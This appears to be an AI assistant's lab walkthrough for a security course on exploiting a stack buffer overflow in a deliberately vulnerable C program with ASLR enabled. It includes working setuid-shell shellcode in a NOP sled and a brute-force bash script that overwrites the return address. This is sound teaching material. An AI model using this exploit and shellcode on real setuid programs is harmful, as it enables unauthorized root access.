


Now that we have the exact code for `vulnerable.c`, we can perfectly map it to the concepts in your course. 

Here is the complete theory breakdown and walkthrough for exploiting `vulnerable.c` with ASLR enabled.

---

### The Theory: Analyzing the Target

Let's look at how the program is compiled and what defenses are active:
```bash
gcc -g -fno-stack-protector -z execstack -o vulnerable vulnerable.c
```
*   **`-fno-stack-protector`**: Disables the Stack Canary. We can overflow the buffer straight into the Saved EIP without causing a crash.
*   **`-z execstack`**: Disables NX (Non-Executable Stack). This means if we can get the instruction pointer to land on our shellcode on the stack, the CPU will execute it.
*   **ASLR is ON**: The stack's memory address changes every time the program runs. We **cannot** simply look at the stack in GDB and hardcode the address of our shellcode like we did in Exercise 9.2.

**The Vulnerability in the Code:**
```c
char buf[128];
strcpy(buf,str); // <-- Buffer overflow!
```
`buf` is 128 bytes, but `strcpy` stops only when it sees a null byte (`\x00`). We can supply an argument larger than 128 bytes to overwrite the Saved EBP and Saved EIP.

---

### The Exploit Strategies

Since ASLR randomizes the stack, how do we find our shellcode? Your slides provide two excellent methods for this exact scenario. 

#### Method 1: The `jmp esp` Gadget (Slide 21: "ret2esp")
*(This is the most elegant method, but depends on finding a specific instruction).*

When a function finishes and calls `ret` (which pops the Saved EIP into the instruction pointer), the Stack Pointer (`ESP`) moves down and points **exactly at the very next byte on the stack**.

If we can find a `jmp esp` or `call esp` instruction somewhere in the binary's code (which isn't randomized unless PIE is explicitly enabled), we can overwrite the Saved EIP with the address of that instruction, and put our shellcode right behind it.

**The Payload Structure:**
`[ Padding ('A's) ] + [ Address of jmp esp ] + [ Shellcode ]`

**Walkthrough:**
1. **Find the offset:** Use GDB to find exactly how many bytes it takes to crash the EIP. For a 128-byte buffer, it usually takes around 132 to 140 bytes of padding (128 for buffer + padding for compiler alignment + 4 for Saved EBP).
2. **Find the gadget:** Search the binary for `jmp esp` or `call esp`.
   ```bash
   objdump -d ./vulnerable | grep -E 'jmp.*esp|call.*esp'
   ```
   *(If you find an address, say `0x08048550`, you are golden. But because this is a very small C program, this instruction might not naturally exist in the `.text` segment. If the search returns nothing, you must use Method 2).*

#### Method 2: NOP Sled + Brute-force (Slide 19: "ASLR bypass #1")
*(This is the most reliable method for this specific exercise).*

On a 32-bit Linux system, ASLR is surprisingly weak. It only randomizes a small portion of the stack address (about 24 bits, or roughly 16 million possibilities, but realistically much less because of how memory pages are mapped). 

Instead of knowing the exact address, we use probability to win:
1. We put our shellcode at the end of a **massive NOP Sled** (e.g., 100,000 `\x90` bytes) stored in an environment variable. 
2. A NOP (`\x90`) tells the CPU to "do nothing and slide to the next instruction". If the CPU lands *anywhere* in those 100,000 bytes, it will slide straight into our shellcode.
3. We pick a random, hardcoded stack address (e.g., `0xffbb0000`).
4. We run the program in an infinite `while` loop, constantly feeding it our hardcoded address. Because ASLR shifts the stack every time, eventually (usually within a few seconds), the massive NOP sled will randomly align so that `0xffbb0000` points right into it.

---

### Complete Walkthrough (Using the Brute-Force Method)

Assuming you are working in a 32-bit environment (based on the shellcode from your prompt), let's execute the brute-force attack.

#### Step 1: Find the exact buffer offset
We need to know exactly how many "A"s to write to hit the Saved EIP. 
```bash
gdb ./vulnerable
(gdb) run $(python3 -c "print('A'*136 + 'BBBB')")
```
Look at where the program crashes (`Segmentation fault at 0x42424242`). 
*   If EIP is `0x42424242`, your offset is exactly **136 bytes**. 
*   If it crashes somewhere else, adjust the number of 'A's until EIP is cleanly overwritten by the 4 'B's. 
*(For this walkthrough, I will assume the offset is 140 bytes, which is standard for a 128-byte array + 8 bytes of compiler alignment + 4 bytes EBP).*

#### Step 2: Put the Shellcode in the Environment
In your terminal, load up a massive NOP sled with your shellcode:
```bash
export SHELLCODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100000 + b"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42")')
```

#### Step 3: Pick a Target Address
When ASLR is on, the 32-bit stack usually floats somewhere between `0xff800000` and `0xffffffff`. 
Let's pick an address right in the middle: `0xffaa0000`. 
Reversed into little-endian for the payload, this is `\x00\x00\xaa\xff`. 
*(Note: Because `strcpy` stops at `\x00`, having null bytes in our return address is actually a problem! It will cut off the string. Let's pick a safer address without null bytes: `0xffaabbcc` -> `\xcc\xbb\xaa\xff`)*.

#### Step 4: Write the Brute-Force Script
Create a bash script called `brute.sh`. This is adapted directly from **Slide 19**.

```bash
#!/bin/bash

# Define the payload: 140 'A's + our guessed stack address
PAYLOAD=$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*140 + b'\xcc\xbb\xaa\xff')")

echo "Starting ASLR brute-force..."

# Infinite loop
while true; do
    # Run the program with the payload. Suppress normal output/crash errors.
    ./vulnerable "$PAYLOAD" > /dev/null 2>&1
    
    # Check the exit status of the program
    # If a program crashes (segfault), exit status is usually 139
    # If our shellcode executes and opens a shell, and we exit it, the exit status will be 0
    if [ $? -eq 0 ]; then
        echo "[+] BINGO! ASLR defeated. Shellcode executed!"
        break
    fi
done
```

#### Step 5: Execute
Make the script executable and run it:
```bash
chmod +x brute.sh
./brute.sh
```

**What is happening dynamically?**
The script runs `vulnerable` thousands of times a second. 
9,999 times, the program will crash in the background because `0xffaabbcc` points to garbage or unmapped memory. 
But eventually, ASLR will randomly shift the stack just right, so that the massive `SHELLCODE` environment variable happens to encompass the address `0xffaabbcc`. The program jumps to it, lands safely in the `\x90` sled, slides down into `/bin/sh`, and you gain control!
